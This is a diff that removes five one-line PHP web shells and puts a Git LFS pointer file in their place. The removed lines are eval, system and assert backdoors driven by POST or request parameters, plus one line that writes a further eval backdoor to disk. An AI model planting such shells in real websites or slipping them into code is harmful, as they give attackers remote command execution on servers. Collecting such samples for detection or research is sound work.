@@ -1,9 +1,3 @@
-<?php eval($_POST[sb])?>
-
-<?php @eval($_POST[c])?>
-
-<?php system($_REQUEST['cmd']);?> 
-
-<?php assert($_POST[c]);?>
-
-<?fputs(fopen(c.php,w),<?eval($_POST[c]);?>)?>
+version https://git-lfs.github.com/spec/v1
+oid sha256:193d7e055051dce9c66470b25010f6334722afd90eab9313f666ce6cb44c9da4
+size 162
